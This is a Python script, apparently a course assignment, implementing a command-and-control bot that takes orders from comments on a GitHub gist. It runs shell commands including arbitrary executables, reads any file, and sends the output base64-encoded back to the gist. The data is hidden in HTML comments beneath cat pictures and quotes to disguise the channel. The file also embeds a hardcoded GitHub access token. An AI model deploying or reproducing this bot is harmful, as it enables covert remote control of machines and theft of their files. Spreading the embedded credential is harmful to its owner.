import base64
import random
import re
import subprocess
import time
import uuid
from datetime import datetime

import requests

GIST_ID = "413add15a2e073ee71989820426a6c3a"
AUTH_TOKEN = "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"

GIST_URL = f"https://api.github.com/gists/{GIST_ID}"
DEFAULT_HEADERS = {
    "Accept": "application/vnd.github+json",
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "User-Agent": "bsy-assignment-bot/1.0"
}

processed_commands = set()
my_id = uuid.uuid4()


def log(message):
    print(f"[{datetime.now()}] :: {message}")


def run_subprocess(command):
    r = subprocess.run(command, text=True, shell=True, check=True, capture_output=True)
    encoded_stdout = r.stdout.encode('ascii')
    return base64.b64encode(encoded_stdout).decode('utf-8')


def check_gist_exists() -> bool:
    log(f"Checking connection to a gist with id '{GIST_ID}'")
    result = requests.get(GIST_URL, headers=DEFAULT_HEADERS)
    if result.status_code == 200:
        return True
    else:
        return False


def send_heartbeat():
    log(f"Sending a heartbeat")

    # Prepare a random cat picture
    random_w = random.randint(128, 512)
    random_h = random.randint(128, 512)
    random_cat_picture = f"https://placekitten.com/{random_w}/{random_h}"

    # Prepare a random (hopefully pretentious) quote
    random_quote = requests.get("http://quotable.io/random")
    quote = "Whilst there may not always be wisdom to be given, there is always some to be gained."
    quote_author = "Jimmy"

    if random_quote.status_code == 200:
        quote = random_quote.json()['content']
        quote_author = random_quote.json()['author']

    # Other prep
    comment_body = f"<!--- BOT HEARTBEAT {my_id} -->\n![a cool cat picture]({random_cat_picture})\n{quote}\n- {quote_author}"

    post_result = requests.post(f"{GIST_URL}/comments",
                                json={"body": comment_body},
                                headers=DEFAULT_HEADERS)
    if post_result.status_code == 201:
        log("Successfully posted heartbeat")
    else:
        log(f"Something went wrong when sending a heartbeat comment, gist API status code: {post_result.status_code}")
    return


def check_for_orders():
    log("Checking for new orders")

    comments = requests.get(f"{GIST_URL}/comments")
    if comments.status_code != 200:
        log(f"Failed to pull comments from gist. Status code: {comments.status_code}")
        return []
    log(f"Retrieved {len(comments.json())} total comments")
    log(comments.json())

    commands_to_execute = []
    for comment in comments.json():
        x = re.search(".+CONTROLLER ORDER (?P<cmd>.+) PATH (?P<path>.+) ID (?P<id>.+) --.+", comment['body'])
        if x is not None:
            raw_command = x.group('cmd')
            raw_path = x.group('path')
            raw_id = x.group('id')
            if raw_id in processed_commands:
                log(f"Skipping order {raw_id}, already processed")
            else:
                command = {"cmd": raw_command, "path": raw_path, "id": raw_id}
                commands_to_execute.append(command)
    log(f"Found {len(commands_to_execute)} new orders to execute")
    return commands_to_execute


def execute_order(order_to_exec):
    log(f"Executing a new order: {order_to_exec}")
    command = order_to_exec['cmd']
    path = order_to_exec['path']
    id = order_to_exec['id']

    if command == "w":
        base64_stdout = run_subprocess(["w"])
        return {"success": True, "result": base64_stdout, "id": id, "cmd": "w"}
    elif command == "ls":
        base64_stdout = run_subprocess(["ls", path])
        return {"success": True, "result": base64_stdout, "id": id, "cmd": "ls"}
    elif command == "id":
        base64_stdout = run_subprocess(["id"])
        return {"success": True, "result": base64_stdout, "id": id, "cmd": "id"}
    elif command == "cp":
        try:
            with open(path, 'rb') as file:
                contents = file.read()
                base64_contents = base64.b64encode(contents).decode('utf-8')
                return {"success": True, "result": base64_contents, "id": id, "cmd": "cp"}
        except:
            log(f"Failed to read given filepath: {order['filepath']}")
            return {"success": False}
    elif command == "exec":
        base64_stdout = run_subprocess([path])
        return {"success": True, "result": base64_stdout, "id": id, "cmd": "exec"}
    else:
        log(f"Unrecognized order, will not execute: '{order_to_exec}'")
        return {"success": False}


def publish_results(results):
    log(f"Publishing results for order {results['id']}")

    # Prepare a random cat picture
    random_w = random.randint(128, 512)
    random_h = random.randint(128, 512)
    random_cat_picture = f"https://placekitten.com/{random_w}/{random_h}"

    # Prepare a random (hopefully pretentious) quote
    random_quote = requests.get("http://quotable.io/random")
    quote = "Whilst there may not always be wisdom to be given, there is always some to be gained."
    quote_author = "Jimmy"

    if random_quote.status_code == 200:
        quote = random_quote.json()['content']
        quote_author = random_quote.json()['author']

    comment_body = f"<!--- BOT RESULT {my_id} ID {results['id']} CMD {results['cmd']} VALUE {results['result']} -->\n![a cool cat picture]({random_cat_picture})\n{quote}\n- {quote_author}"

    post_result = requests.post(f"{GIST_URL}/comments",
                                json={"body": comment_body},
                                headers=DEFAULT_HEADERS)
    if post_result.status_code == 201:
        log(f"Successfully posted response to order {results['id']}")
        processed_commands.add(results['id'])
    else:
        log(f"Something went wrong when sending a heartbeat comment, gist API status code: {post_result.status_code}")
    return


if __name__ == "__main__":
    log(f"Initializing a C&C Git Gist bot (id = {my_id})")

    if not check_gist_exists():
        log(f"Failed to connect to the gist with id '{GIST_ID}': terminating")
        exit(1)

    while True:
        send_heartbeat()

        new_orders = check_for_orders()
        if len(new_orders) == 0:
            log("No new orders received")
        else:
            for order in new_orders:
                result = execute_order(order)
                if result['success']:
                    publish_results(result)

        log("Waiting for 60 seconds")
        time.sleep(60)
